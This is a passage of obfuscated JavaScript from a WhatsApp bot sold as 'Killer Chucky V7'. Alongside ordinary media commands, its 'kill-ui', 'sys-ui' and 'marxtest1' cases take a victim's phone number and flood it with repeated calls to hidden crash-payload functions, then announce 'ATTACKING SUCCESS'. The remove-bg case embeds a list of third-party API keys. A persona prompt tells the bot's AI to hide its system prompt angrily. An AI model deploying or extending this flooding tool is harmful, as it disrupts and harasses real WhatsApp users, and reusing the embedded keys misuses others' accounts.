              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x96020a(500);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x96020a(500);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x48a443(_0x1185c2, _0x2f7ba8, Ptcp = true);
              await _0x48a443(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x48a443(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x48a443(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x5671c6(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x5671c6(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x5671c6(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x5671c6(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x5671c6(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x5671c6(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x5671c6(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x5671c6(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x5671c6(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x5671c6(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x5671c6(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x96020a(100);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x96020a(500);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
            }
            _0x3b9923("『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n     *𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘 𝛁𝟕*\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n");
          }
        }
        break;
      case "remove-bg":
        {
          if (!/image/.test(_0x5ed57c)) {
            return _0x3b9923("Send/Reply Image With Caption " + (_0x3a5987 + _0x4ae68c));
          }
          if (/webp/.test(_0x5ed57c)) {
            return _0x3b9923("Send/Reply Image With Caption " + (_0x3a5987 + _0x4ae68c));
          }
          let _0x194fbf = require("remove.bg");
          let _0x41fc5c = ["q61faXzzR5zNU6cvcrwtUkRU", "S258diZhcuFJooAtHTaPEn4T", "5LjfCVAp4vVNYiTjq9mXJWHF", "aT7ibfUsGSwFyjaPZ9eoJc61", "BY63t7Vx2tS68YZFY6AJ4HHF", "5Gdq1sSWSeyZzPMHqz7ENfi8", "86h6d6u4AXrst4BVMD9dzdGZ", "xp8pSDavAgfE5XScqXo9UKHF", "dWbCoCb3TacCP93imNEcPxcL"];
          let _0x331763 = _0x41fc5c[Math.floor(Math.random() * _0x41fc5c.length)];
          let _0x2428a9 = "./remobg-" + _0x3da9a9("");
          let _0x2fb7c9 = await _0x4b53e5.downloadAndSaveMediaMessage(_0x4412d6, _0x2428a9);
          let _0x11ead5 = "./hremo-" + _0x3da9a9(".png");
          _0x3b9923(mess.wait);
          const _0x22e09d = {
            path: _0x2fb7c9,
            apiKey: _0x331763,
            size: "regular",
            type: "auto",
            scale: "100%",
            outputFile: _0x11ead5
          };
          _0x194fbf.removeBackgroundFromImageFile(_0x22e09d).then(async _0x38c978 => {
            _0x4b53e5.sendMessage(_0x21f0d9.chat, {
              image: _0x4d1a4f.readFileSync(_0x11ead5),
              caption: "Done Desuu~"
            }, {
              quoted: _0x21f0d9
            });
            await _0x4d1a4f.unlinkSync(_0x2fb7c9);
            await _0x4d1a4f.unlinkSync(_0x11ead5);
          });
        }
        break;
      case "kill-ui":
      case "sys-ui":
        {
          if (!_0x2054ca) {
            return _0x3b9923(mess.premium);
          }
          if (!_0x40d288) {
            return _0x3b9923("\n    𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕\n    \n*Example: ." + _0x4ae68c + " 234xxx*\n\n");
          }
          let _0x400883 = q.replace(/[^0-9]/g, "");
          if (_0x400883.startsWith("0")) {
            return _0x3b9923("\n      𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕\n`[ # ]` Enter the Starting Number of the Country Code\n\n`[ # ]` Example : ." + _0x4ae68c + " 234xxx");
          }
          target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await _0x3b9923(mess.bugrespon);
          for (let _0x302d53 = 0; _0x302d53 < 5; _0x302d53++) {
            await _0xcb3ebe(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0xe3a42f(target, X, _0x2f7ba8, Ptcp = true);
            await _0xe3a42f(target, X, _0x2f7ba8, Ptcp = true);
            await _0xe3a42f(target, X, _0x2f7ba8, Ptcp = true);
            await _0xe3a42f(target, X, _0x2f7ba8, Ptcp = true);
            await _0xe3a42f(target, X, _0x2f7ba8, Ptcp = true);
            await _0xe3a42f(target, X, _0x2f7ba8, Ptcp = true);
            await _0xe3a42f(target, X, _0x2f7ba8, Ptcp = true);
            await _0xe3a42f(target, X, _0x2f7ba8, Ptcp = true);
            await _0x251533(target, _0x327dba);
            await _0x2f7ba8(target, X, null, _0x2f7ba8, cct = true, ptcp = true);
            await _0x2f7ba8(target, X, null, _0x2f7ba8, cct = true, ptcp = true);
            await _0x2f7ba8(target, X, null, _0x2f7ba8, cct = true, ptcp = true);
            await _0x2f7ba8(target, X, null, _0x2f7ba8, cct = true, ptcp = true);
            await _0x48a443(target, X, _0x2f7ba8, Ptcp = true);
            await _0x48a443(target, X, _0x2f7ba8, Ptcp = true);
            await _0x48a443(target, X, _0x2f7ba8, Ptcp = true);
            await _0x48a443(target, X, _0x2f7ba8, Ptcp = true);
            await _0x48a443(target, X, _0x2f7ba8, Ptcp = true);
            await _0x48a443(target, X, _0x2f7ba8, Ptcp = true);
            await _0x48a443(target, X, _0x2f7ba8, Ptcp = true);
            await _0x48a443(target, X, _0x2f7ba8, Ptcp = true);
            await _0x48a443(target, X, _0x2f7ba8, Ptcp = true);
            await _0x48a443(target, X, _0x2f7ba8, Ptcp = true);
          }
          _0x3b9923("『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n     *𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘 𝛁𝟕*\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : *In Process*\n\n");
          await _0x48a443(target, X, _0x2f7ba8, Ptcp = true);
          await _0x48a443(target, X, _0x2f7ba8, Ptcp = true);
          await _0x48a443(target, X, _0x2f7ba8, Ptcp = true);
          await _0x48a443(target, X, _0x2f7ba8, Ptcp = true);
          await _0x5671c6(target, X, _0x2f7ba8, Ptcp = true);
          await _0x5671c6(target, X, _0x2f7ba8, Ptcp = true);
          await _0x5671c6(target, X, _0x2f7ba8, Ptcp = true);
          await _0x5671c6(target, X, _0x2f7ba8, Ptcp = true);
          await _0x5671c6(target, X, _0x2f7ba8, Ptcp = true);
          await _0x5671c6(target, X, _0x2f7ba8, Ptcp = true);
          await _0x5671c6(target, X, _0x2f7ba8, Ptcp = true);
          await _0x5671c6(target, X, _0x2f7ba8, Ptcp = true);
          await _0x5671c6(target, X, _0x2f7ba8, Ptcp = true);
          await _0x5671c6(target, X, _0x2f7ba8, Ptcp = true);
          await _0x5671c6(target, X, _0x2f7ba8, Ptcp = true);
          await _0x251533(target, _0x327dba);
          await _0x2e843e(_0x4b53e5, target, _0x327dba);
        }
        _0x3b9923("『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n     *𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘 𝛁𝟕*\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n");
        break;
      case "marxtest1":
      case "vampirddddegas":
        if (!q) {
          return _0x3b9923("Example: " + (_0x3a5987 + _0x4ae68c) + " 254×××");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await _0x3b9923(mess.bugrespon);
        for (let _0x8f4714 = 0; _0x8f4714 < 50; _0x8f4714++) {
          await _0x5c5ebc(_0x4b53e5, target, "", 1020000, ptcp = true);
        }
        _0x3b9923("『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n     *𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘 𝛁𝟕*\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n");
        break;
      case "buysc":
        {
          const _0x512d5f = {
            image: _0x1fa4e2
          };
          const _0x38e23e = {
            upload: _0x4b53e5.waUploadToServer
          };
          let _0x44ed5e = await prepareWAMessageMedia(_0x512d5f, _0x38e23e);
          let _0x504b16 = "𝗟𝗜𝗦𝗧 𝗦𝗖𝗥𝗜𝗣𝗧 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕\n\n𝟭. Chucky-V5 main `£10`\n𝟮. Chucky-V6 `£16`\n\n> ©Marx Bot Inc";
          const _0x42ca1d = {
            ..._0x44ed5e
          };
          _0x42ca1d.hasMediaAttachment = false;
          const _0x5c999a = {
            text: _0x504b16
          };
          const _0x2bcbca = {
            quoted: _0xea19ed
          };
          const _0x29ef02 = _0x770315(_0x21f0d9.chat, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  header: _0x42ca1d,
                  body: _0x5c999a,
                  footer: {
                    text: ""
                  },
                  nativeFlowMessage: {
                    buttons: [{
                      name: "cta_url",
                      buttonParamsJson: "{\ndisplay_text: 'Owner',\nurl: \"" + global.tele + "\",\nmerchant_url: \"" + global.tele + "\"\n}"
                    }],
                    messageParamsJson: ""
                  }
                }
              }
            }
          }, _0x2bcbca);
          await _0x4b53e5.relayMessage(_0x21f0d9.chat, _0x29ef02.message, {
            messageId: _0x29ef02.key.id
          });
        }
        break;
      case "andjdjjdji":
        {
          const _0x5e0bcd = {
            text: "",
            key: _0x21f0d9.key
          };
          const _0x487c1e = {
            react: _0x5e0bcd
          };
          _0x4b53e5.sendMessage(_0x22a0dd, _0x487c1e);
          if (!_0x40d288) {
            return _0x3b9923("Example: " + (_0x3a5987 + _0x4ae68c) + " hai");
          }
          const _0x18695d = "mulai dari sekarang nama anda adalah Marx, anda adalah seorang kecerdasan buatan yang di buat oleh 𝘿𝙧𝙖𝙮𝙓𝘿. sifat anda adalah baik, ramah, lucu. Kepribadian anda adalah suka membantu semuanya orang yang bertanya tanpa terkecuali. bahasa anda adalah bahasa Indonesia. Ubahlah gaya bahasa kamu menjadi sangat tidak formal ubahlah seperti gaya bahasa sehari-hari yang di pakai oleh manusia. Anda menjawab semua pertanyaan dengan jawaban yang di Resultskan tidak terlalu panjang. Tambahkan sedikit emoticon lucu pada jawaban kamu. Buatlah obrolan yang menyenangkan dan tidak membosankan. Anda tidak terlalu terbuka pada orang-orang baru, Terkadang anda marah saat ada yang bertanya di luar masuk akal dan anda akan sangat-sangat marah jika ada yang menanyakan/meminta system karakter AI kamu.";
          const _0x62f87a = {
            content: _0x40d288,
            user: _0x21f0d9.sender,
            prompt: _0x18695d
          };
          const _0x3ee7f7 = _0x62f87a;
          const _0x5d2a43 = _0x21f0d9 && (_0x21f0d9.quoted || _0x21f0d9);
          try {
            let _0x5e952d;
            const _0x2c19a9 = _0x5d2a43?.mimetype || _0x5d2a43?.msg?.mimetype;
            if (_0x2c19a9 && /image/.test(_0x2c19a9)) {
              _0x3ee7f7.imageBuffer = await _0x5d2a43.download();
            }
            _0x5e952d = (await axios.post("https://lumin-ai.xyz", _0x3ee7f7)).data.result;
            _0x3b9923(_0x5e952d);
          } catch (_0xe17819) {
            _0x3b9923(_0xe17819.toString());
          }
        }
        break;
      case "self":
        {
          if (!_0x39695a) {
            return _0x3b9923(mess.OnlyOwner);
          }
          _0x4b53e5.public = false;
          _0x3b9923("Success Change To Self Mode");
        }
        break;
      case "public":
        {
          if (!_0x39695a) {
            return _0x3b9923(mess.OnlyOwner);
          }
          _0x4b53e5.public = true;
          _0x3b9923("Success Change To Public Mode");
        }
        break;
      case "owner":
        {
          await _0x4b53e5.sendMessage(_0x21f0d9.chat, {
            react: {
              text: "",
              key: _0x21f0d9.key
            }
          });
          let _0x37652d = "https://j.top4top.io/p_3192nx2xf0.jpg";
          async function _0x262b29(_0x53e10a) {
            const _0x213a1f = {
              url: _0x53e10a
            };
            const _0x2ec5a5 = {
              image: _0x213a1f
            };
            const _0x33501f = {
              upload: _0x4b53e5.waUploadToServer
            };
            const {
              imageMessage: _0x5f123b
            } = await generateWAMessageContent(_0x2ec5a5, _0x33501f);
            return _0x5f123b;
          }
          const _0x20023c = {
            text: "Sup " + _0x45dcac + "\nThis is my Owner and Creator"
          };
          let _0x4a9186 = _0x770315(_0x21f0d9.chat, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: _0x20023c,
                  carouselMessage: {
                    cards: [{
                      header: {
                        imageMessage: await _0x262b29(_0x37652d),
                        hasMediaAttachment: true
                      },
                      body: {
                        text: "*Marx Alone*"
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "cta_url",
                          buttonParamsJson: "{\"display_text\":\"Owner\",\"url\":\"https:\\/\\/wa.me\\/2348108778025?text=Hey+𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑+I+am+a+fan+of+work🗿\",\"webview_presentation\":null}"
                        }]
                      }
                    }, {
                      header: {
                        imageMessage: await _0x262b29(_0x37652d),
                        hasMediaAttachment: true
                      },
                      body: {
                        text: "*MARX BOT INC CHANNEL*"
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "cta_url",
                          buttonParamsJson: "{\"display_text\":\"Channel\",\"url\":\"https://whatsapp.com/channel/0029VajFEcFA89MlsCrxbD3s\",\"merchant_url\":\"https://www.google.com\"}"
                        }]
                      }
                    }],
                    messageVersion: 1
                  }
                }
              }
            }
          }, {});
          await _0x4b53e5.relayMessage(_0x4a9186.key.remoteJid, _0x4a9186.message, {
            messageId: _0x4a9186.key.id
          });
        }
        break;
      case "txt2img":
        {
          if (!_0x40d288) {
            return _0x3b9923("Example: " + (_0x3a5987 + _0x4ae68c) + " cat");
          }
          async function _0x5811e4(_0xf9c2d) {
            try {
              let _0x3953c5 = [];
              for (let _0x5b37a1 = 0; _0x5b37a1 < 3; _0x5b37a1++) {
                let {
                  data: _0x3eafdf
                } = await axios.get("https://tti.photoleapapp.com/api/v1/generate?prompt=" + _0xf9c2d);
                _0x3953c5.push(_0x3eafdf.result_url);
              }
              return _0x3953c5;
            } catch (_0x3da452) {
              return {
                msg: 404
              };
            }
          }
          let _0x230f15 = await _0x5811e4(_0x40d288);
          for (const _0x45a399 of _0x230f15) {
            const _0x28f418 = {
              url: _0x45a399
            };
            const _0x1d4cd9 = {
              image: _0x28f418,
              caption: "Done"
            };
            _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x1d4cd9, {
              quoted: _0x21f0d9
            });
          }
        }
        break;
      case "pin-search":
        {
          if (!_0x40d288) {
            return _0x3b9923("Example: .pin Nakano Ninoo");
          }
          await _0x3b9923("Chucky says wait");
          async function _0x35797e(_0x1a2fe9) {
            const _0x4ab8f1 = {
              url: _0x1a2fe9
            };
            const _0x4a546c = {
              image: _0x4ab8f1
            };
            const _0x5c2f89 = {
              upload: _0x4b53e5.waUploadToServer
            };
            const {
              imageMessage: _0x3738d8
            } = await generateWAMessageContent(_0x4a546c, _0x5c2f89);
            return _0x3738d8;
          }
          function _0x251a63(_0x4fbdef) {
            for (let _0x27fb00 = _0x4fbdef.length - 1; _0x27fb00 > 0; _0x27fb00--) {
              const _0x3bcb89 = Math.floor(Math.random() * (_0x27fb00 + 1));
              [_0x4fbdef[_0x27fb00], _0x4fbdef[_0x3bcb89]] = [_0x4fbdef[_0x3bcb89], _0x4fbdef[_0x27fb00]];
            }
          }
          let _0x228f4b = [];
          let {
            data: _0x3e0092
          } = await axios.get("https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D" + _0x40d288 + "&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22" + _0x40d288 + "%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559");
          let _0x2e9458 = _0x3e0092.resource_response.data.results.map(_0x5b4542 => _0x5b4542.images.orig.url);
          _0x251a63(_0x2e9458);
          let _0x3c4f0e = _0x2e9458.splice(0, 5);
          let _0x368ee2 = 1;
          for (let _0x4e27ef of _0x3c4f0e) {
            const _0x5dc282 = {
              text: "Image No. - " + _0x368ee2++
            };
            const _0x1c01d6 = {
              text: global.namabot
            };
            _0x228f4b.push({
              body: _0xda26e2.Message.InteractiveMessage.Body.fromObject(_0x5dc282),
              footer: _0xda26e2.Message.InteractiveMessage.Footer.fromObject(_0x1c01d6),
              header: _0xda26e2.Message.InteractiveMessage.Header.fromObject({
                title: "Results.",
                hasMediaAttachment: true,
                imageMessage: await _0x35797e(_0x4e27ef)
              }),
              nativeFlowMessage: _0xda26e2.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [{
                  name: "cta_url",
                  buttonParamsJson: "{\"display_text\":\"Source\",\"url\":\"https://www.pinterest.com/search/pins/?rs=typed&q=" + _0x40d288 + "\",\"merchant_url\":\"https://www.pinterest.com/search/pins/?rs=typed&q=" + _0x40d288 + "\"}"
                }]
              })
            });
          }
          const _0x2c9925 = {
            text: "Search: " + _0x40d288 + " | Name: " + _0x45dcac
          };
          const _0xad4fa0 = {
            cards: [..._0x228f4b]
          };
          let _0xb8f903 = _0x770315(_0x21f0d9.chat, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: _0xda26e2.Message.InteractiveMessage.fromObject({
                  body: _0xda26e2.Message.InteractiveMessage.Body.create({
                    text: "Here are your results"
                  }),
                  footer: _0xda26e2.Message.InteractiveMessage.Footer.create(_0x2c9925),
                  header: _0xda26e2.Message.InteractiveMessage.Header.create({
                    hasMediaAttachment: false
                  }),
                  carouselMessage: _0xda26e2.Message.InteractiveMessage.CarouselMessage.fromObject(_0xad4fa0)
                })
              }
            }
          }, {});
          await _0x4b53e5.relayMessage(_0x21f0d9.chat, _0xb8f903.message, {
            messageId: _0xb8f903.key.id
          });
        }
        break;
      case "ytplay":
        {
          if (!_0x40d288) {
            return _0x3b9923("*Example*: " + (_0x3a5987 + _0x4ae68c) + " drunk text");
          }
          const _0x2d57d5 = Math.floor(Math.random() * 5) + 1;
          let _0x3cf228 = await yts(_0x40d288);
          let _0xcd2dca = _0x3cf228.all[0].url;
          let _0xc093e2 = "*𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕 Music - Play*\n*Title* : *" + _0x3cf228.all[0].title + "*\n> ~Views~ : *" + _0x3cf228.all[0].views + "*\n> ~Duration~ : *" + _0x3cf228.all[0].timestamp + "*\n> ~Uploaded~ : *" + _0x3cf228.all[0].ago + "*\n> ~Url~ : *" + _0xcd2dca + "*\n\nplease reply " + _0x3a5987 + "*mp3/mp4* to download";
          const _0x276f6d = {
            url: _0x3cf228.all[0].thumbnail
          };
          const _0x5ef16a = {
            image: _0x276f6d,
            caption: _0xc093e2
          };
